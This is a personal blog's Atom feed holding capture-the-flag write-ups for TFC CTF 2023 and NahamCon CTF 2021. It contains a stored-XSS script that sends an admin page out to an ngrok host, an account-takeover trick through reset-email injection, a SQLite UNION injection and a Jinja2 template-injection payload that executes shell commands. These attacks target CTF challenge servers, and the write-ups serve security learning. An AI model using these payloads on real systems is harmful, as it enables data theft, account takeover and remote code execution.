<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://mrecho123.github.io</id>
    <title>NSS</title>
    <updated>2023-08-04T23:34:46.956Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://mrecho123.github.io"/>
    <link rel="self" href="https://mrecho123.github.io/atom.xml"/>
    <subtitle>Mrecho</subtitle>
    <logo>https://mrecho123.github.io/images/avatar.png</logo>
    <icon>https://mrecho123.github.io/favicon.ico</icon>
    <rights>All rights reserved 2023, NSS</rights>
    <entry>
        <title type="html"><![CDATA[TFC CTF 2023 - web challenges üê±‚Äçüíª]]></title>
        <id>https://mrecho123.github.io/post/tfc-ctf-2023-web-challenges/</id>
        <link href="https://mrecho123.github.io/post/tfc-ctf-2023-web-challenges/">
        </link>
        <updated>2023-08-03T03:21:54.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Hello again , The past weekend I played TFC CTF it was fun üòÉ , here is the interesting challenges that I solved in the web category ; enjoy üëå</strong></p>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-527102"><label class="task-list-item-label" for="task-item-527102"> Baby ducky notes and the part 2 (revenge)</label></li>
<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-7575419"><label class="task-list-item-label" for="task-item-7575419"> MCTREE</label></li>
</ul>
<hr>
<h2 id="baby-ducky-notes-part-1-2">Baby ducky notes Part 1 &amp; 2</h2>
<p>Found an stored xss in the posts in<br>
this help me see aswel <a href="https://xss.report/dashboard">Link to xss tool</a></p>
<p>Payloads used to grab /posts where only admin bot can access :</p>
<pre><code class="language-javascript">&lt;script&gt;
  fetch(&quot;http://localhost:1337/posts&quot;, {
    method: &quot;GET&quot;,
    credentials: &quot;include&quot;,
  })
    .then((response) =&gt; response.text())
    .then((html) =&gt; {
      const base64Html = btoa(html);
      const img = new Image();
      img.src = &quot;https://1cc5-41-140-89-213.ngrok-free.app?c=&quot; + encodeURIComponent(base64Html);
    })
&lt;/script&gt;



Local :
&lt;script&gt;
  fetch(&quot;http://localhost:1337/posts&quot;, {
    method: &quot;GET&quot;,
    credentials: &quot;include&quot;,
  })
    .then((response) =&gt; response.text())
    .then((html) =&gt; {
      const base64Html = btoa(html);
      const img = new Image();
      img.src = &quot;https://1cc5-41-140-89-213.ngrok-free.app?c=&quot; + encodeURIComponent(base64Html);
    })
    .catch((error) =&gt; console.error(&quot;Error&quot;, error));
&lt;/script&gt;




server : 

&lt;script&gt;
  fetch(&quot;http://challs.tfcctf.com:32728/posts&quot;, {
    method: &quot;GET&quot;,
    credentials: &quot;include&quot;,
  })
    .then((response) =&gt; response.text())
    .then((html) =&gt; {
      const base64Html = btoa(html);
      const img = new Image();
      img.src = &quot;https://1cc5-41-140-89-213.ngrok-free.app?c=&quot; + encodeURIComponent(base64Html);
    })
    .catch((error) =&gt; console.error(&quot;Error&quot;, error));
&lt;/script&gt;

</code></pre>
<p>Final payload :</p>
<figure data-type="image" tabindex="1"><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136820462500986960/image.png" alt="img" loading="lazy"></figure>
<p>Report the posts to admin, then wait for the bot to visit it then boom :</p>
<p><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136818055666749540/Pasted_image_20230728210643.png" alt="img" loading="lazy"><br>
<em>Base64 of /posts includes the flag</em></p>
<figure data-type="image" tabindex="2"><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136818054534266960/Pasted_image_20230728210703.png" alt="img" loading="lazy"></figure>
<h2 id="mctree">Mctree</h2>
<p><strong>Objective:</strong> login as admin ..</p>
<p>My thaughts were:</p>
<blockquote>
<p>the input is been sanitized from html tags and u should focus on user input manipulation &amp; username set to maximum 12 characters</p>
</blockquote>
<p><strong>POC</strong></p>
<ul>
<li>register as admin%00:admin</li>
<li>so when u register a username it strips away those characters &lt;&gt;%^ ; so if</li>
<li>Regiter as admin&lt;&gt;:admin u overight admins password that it</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136818055410884708/Pasted_image_20230729122443.png" alt="img" loading="lazy"></figure>
<p><span style="background-color: #C6BF9C;"> In conclusion : keep better notes when you trying to solve a CTF challenge and try evrything that comes to your mind , and more writeups you read the more ideas you will have , till then C ya üòâ </span></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[NahamCon CTF Writeup 2021 üê±‚Äçüíª]]></title>
        <id>https://mrecho123.github.io/post/nahamcon-ctf-writeup-2021/</id>
        <link href="https://mrecho123.github.io/post/nahamcon-ctf-writeup-2021/">
        </link>
        <updated>2021-03-13T10:17:07.000Z</updated>
        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*W-_7lDYsjx_LEwi92McTeQ.png" alt="img" loading="lazy"></figure>
<p><strong>Hello, I m Mr_echo, I m played Nahamcon CTF 2021 this weekend, and I'm gonna write some interesting challenges that I solved üëå.~Enjoy</strong></p>
<h2 id="1-homeward-bound-web-50-p">1. Homeward Bound [WEB 50 p]</h2>
<h3 id="objective"><strong>Objective</strong>:</h3>
<p><strong>-bypass 404</strong></p>
<p><a href="http://challenge.nahamcon.com:30903/">http://challenge.nahamcon.com:30903</a></p>
<ul>
<li><strong>NOTE: That message is intended. This challenge is working as it should.</strong></li>
</ul>
<p>So I tried to bypass this page by adding headers</p>
<ul>
<li>I found this awesome tool &gt;<a href="https://github.com/lobuhi/byp4xx.git">https://github.com/lobuhi/byp4xx.git</a></li>
</ul>
<blockquote>
<p>./byp4xx.sh -c <a href="http://challenge.nahamcon.com:30903/">http://challenge.nahamcon.com:30903/</a></p>
</blockquote>
<p><img src="https://cdn-images-1.medium.com/max/3152/1*hwm2V563x1_of2vPdvzDlg.png" alt="*results" loading="lazy">*<em>results</em></p>
<blockquote>
<p>curl -ki -H ‚ÄúX-Forwarded-For: 127.0.0.1‚Äù -X GET ‚Äú<a href="http://challenge.nahamcon.com:30903//">http://challenge.nahamcon.com:30903//</a>&quot;</p>
</blockquote>
<p><img src="https://cdn-images-1.medium.com/max/3358/1*Uc_-vsG0JS7PTg2JrrJgbQ.png" alt="done" loading="lazy"><em>done</em></p>
<h2 id="2-imposter-web-500">2. Imposter [WEB 500]</h2>
<h3 id="objective-2">Objective:</h3>
<p><strong>-account take over using reset functionality<br>
-bypass 2FA<br>
-generate OTP</strong></p>
<p>Are you who you say you are? How can you be not?</p>
<ul>
<li><a href="http://challenge.nahamcon.com:31068/">http://challenge.nahamcon.com:31068</a></li>
</ul>
<p>Let's take a look at the web app</p>
<p><img src="https://cdn-images-1.medium.com/max/2446/1*nsknDSpmgwsBdttm2qdq7w.png" alt="*sign in and sign up page" loading="lazy">*<em>sign in and sign up page</em></p>
<p>Let's create a test user</p>
<figure data-type="image" tabindex="2"><img src="https://cdn-images-1.medium.com/max/2000/1*H-Nlrs16-i04O15Ghi-9-A.png" alt="" loading="lazy"></figure>
<p>Give us this QR code</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*8Kmutw53bI4MIkaNHqTojA.png" alt="otp" loading="lazy"><em>otp</em></p>
<ul>
<li>
<p><strong>Otpauth</strong></p>
</li>
<li>
<p><strong>2Password:test &lt; user</strong></p>
</li>
<li>
<p><strong>?secret=ORSXG5BRGIZTINJWG44DS [<strong>test123456789</strong>]&lt; base32 user+pass</strong></p>
</li>
<li>
<p><strong>issuer=2Password</strong></p>
</li>
</ul>
<p>Lets try to login as test user</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*ttsEHaPlS8z9KZ8pkQm-Ig.png" alt="how we can generate the 2Fa otp" loading="lazy"><em>how we can generate the 2Fa otp</em></p>
<p>so we use google auth</p>
<blockquote>
<p><em>The OTP thing is down üò¶(</em>*</p>
</blockquote>
<ul>
<li>trying to reset test user pass : [test:<a href="mailto:test@cc.com">test@cc.com</a>:qerty123456] the new pass reset : hacked12345678</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://cdn-images-1.medium.com/max/2000/1*VmTGF6xOhbjNxW2PBcmlNg.png" alt="" loading="lazy"></figure>
<ul>
<li>trying to reset the password of the admin</li>
</ul>
<figure data-type="image" tabindex="4"><img src="https://cdn-images-1.medium.com/max/2000/1*KFnsN7Tvk1mmPSBLlVjbNg.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>turn out there is an injection just add ‚Äú;‚Äù [your_email;admin@congon4tor.me]</p>
</li>
<li>
<p>u will get a reset URL in your email üòÉ)</p>
</li>
</ul>
<p><img src="https://cdn-images-1.medium.com/max/2958/1*JwllEp2eW4OaT4vS8eOk4w.png" alt=":)))" loading="lazy"><em>üòÉ))</em></p>
<ul>
<li>Login as admin and get the flag üòÉ)</li>
</ul>
<h2 id="3-agenttester-web-500p">3. AgentTester [WEB 500p]</h2>
<h3 id="objective-3">Objective:</h3>
<ul>
<li>
<p>Sqlite3 injection</p>
</li>
<li>
<p>SSTI (server-side template injection)</p>
</li>
</ul>
<p>We‚Äôve recently hired an entry-level web developer to build an internal system to test User Agents, let us know if you find any errors!</p>
<ul>
<li>
<p><a href="http://challenge.nahamcon.com:31047/">http://challenge.nahamcon.com:31047</a></p>
</li>
<li>
<p>agenttester.zip</p>
</li>
</ul>
<p><img src="https://cdn-images-1.medium.com/max/2424/1*eITBTmJ3jiE_fZBEgiYfQw.png" alt="*login page" loading="lazy">*<em>login page</em></p>
<p>Let's create a test user</p>
<p><img src="https://cdn-images-1.medium.com/max/2514/1*fZw0CYdti_PELoXrRyHxNQ.png" alt="*SQLi" loading="lazy">*<em>SQLi</em></p>
<p>Trying regular strings; nothing üò¶(</p>
<p>BUT</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*w46DkxRdjIceLGSmItXiLQ.png" alt="HMMM" loading="lazy"><em>HMMM</em></p>
<p>So we have syntax error of sqlite3</p>
<ul>
<li>
<p>Using <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</a></p>
</li>
<li>
<p>custom payload: test‚Äô union select username, password from user where ‚Äò1‚Äô=‚Äô1</p>
</li>
</ul>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*LNq1xnpmR0vLmvD8J_DUww.png" alt="*yay" loading="lazy">*<em>yay</em></p>
<ul>
<li>user: admin ; pass : <code>*)([@skdnaj238374834](http://twitter.com/skdnaj238374834)**__**=</code></li>
</ul>
<p>Login as admin :</p>
<figure data-type="image" tabindex="5"><img src="https://cdn-images-1.medium.com/max/2962/1*bEzoIxuzuXbTuT5KlRj34Q.png" alt="" loading="lazy"></figure>
<p>Nothing interesting; no admin panel üò¶(</p>
<p>so let's move on to the source code</p>
<p>In /app/app.py</p>
<ul>
<li>
<p>/debug dir with post request condition and id = 1</p>
</li>
<li>
<p>so we go to /debug and set id cookie to 1</p>
</li>
</ul>
<figure data-type="image" tabindex="6"><img src="https://cdn-images-1.medium.com/max/2940/1*jdAaMI_gvJeqpL0bFPoGQA.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>code = request.form.get(‚Äúcode‚Äù, ‚Äú<h1>Safe Debug</h1>‚Äù)<br>
return render_template_string(code)</p>
</li>
<li>
<p>lets try code=test</p>
</li>
</ul>
<p><img src="https://cdn-images-1.medium.com/max/2178/1*-LufItCALQK3tcXOniYfxg.png" alt="render as text" loading="lazy"><em>render as text</em></p>
<ul>
<li>
<p>‚Äúrender_template_string‚Äù function kinda interesting so let's try some template payloads aka SSTI <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#:~:text=A%20server%2Dside%20template%20injection,is%20then%20executed%20server%2Dside.&amp;text=Server%2Dside%20template%20injection%20attacks,than%20passed%20in%20as%20data.">here</a></p>
</li>
<li>
<p>sens we have flask python server <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">here</a></p>
</li>
<li>
<p>simple payload {{7*7}} if = 49 we will try advance payloads to get rce</p>
</li>
</ul>
<p><img src="https://cdn-images-1.medium.com/max/2610/1*unjqmFHJ1-L-v2_p0Mk2XQ.png" alt="yay" loading="lazy"><em>yay</em></p>
<ul>
<li>advance payloads found <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">here</a></li>
</ul>
<blockquote>
<p>payload {{request.application.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>(‚Äòos‚Äô).popen(‚Äòprintenv‚Äô).read()}}</p>
</blockquote>
<p><img src="https://cdn-images-1.medium.com/max/2822/1*nPLBRyPfCM-eOxBQdnd3MQ.png" alt="RCE :))" loading="lazy"><em>RCE üòÉ)</em></p>
<p><em>Let us hunt the flag</em></p>
<blockquote>
<p>u will not find it anywhere on the server</p>
</blockquote>
<ul>
<li>let's come back to the giving source code</li>
</ul>
<p><em>there is a file called run.sh</em></p>
<blockquote>
<p>export CHALLENGE_NAME=‚ÄùAgentTester‚Äù &amp;&amp; export CHALLENGE_FLAG=‚Äù<REDACTED>‚Äù\</p>
</blockquote>
<ul>
<li>so the flag is stored in the env</li>
</ul>
<p>we can dump it using ‚Äúprintenv‚Äù</p>
<p><img src="https://cdn-images-1.medium.com/max/3092/1*Kr-CIpIKXwWtc-eh_diJ3w.png" alt="yay" loading="lazy"><em>yay</em></p>
<h2 id="4-resourceful-mobile-50-p">4. Resourceful [Mobile 50 p]</h2>
<h3 id="objective-4"><strong>Objective:</strong></h3>
<ul>
<li>
<p><strong>Password stored on the source code</strong></p>
</li>
<li>
<p><strong>using<a href="https://github.com/skylot/jadx/releases/tag/v1.2.0"> jadx-gui</a></strong></p>
</li>
</ul>
<p>Running the apk file</p>
<p><img src="https://cdn-images-1.medium.com/max/2396/1*Eo9gYwt3GE7WEOIECCuEyw.png" alt="*password" loading="lazy">*<em>password</em></p>
<p>Password needed, so let us analyze this app using jadk</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*yFfyJHvU6tUsZtlHx-4Svg.png" alt="search password in the search section" loading="lazy"><em>search password in the search section</em></p>
<p>found stored password</p>
<p><img src="https://cdn-images-1.medium.com/max/2000/1*Wo8p04_yeYXYkepiwDc1oQ.png" alt="yay" loading="lazy"><em>yay</em></p>
<p>we got the flag üòÉ)</p>
<figure data-type="image" tabindex="7"><img src="https://cdn-images-1.medium.com/max/2000/1*ceYCCx23VyjF9XdQrbNyjQ.png" alt="" loading="lazy"></figure>
<p>BTW THIS IS MY FIRST WRITEUP üòÉ) LIKE AND FOLLOW</p>
]]></content>
    </entry>
</feed>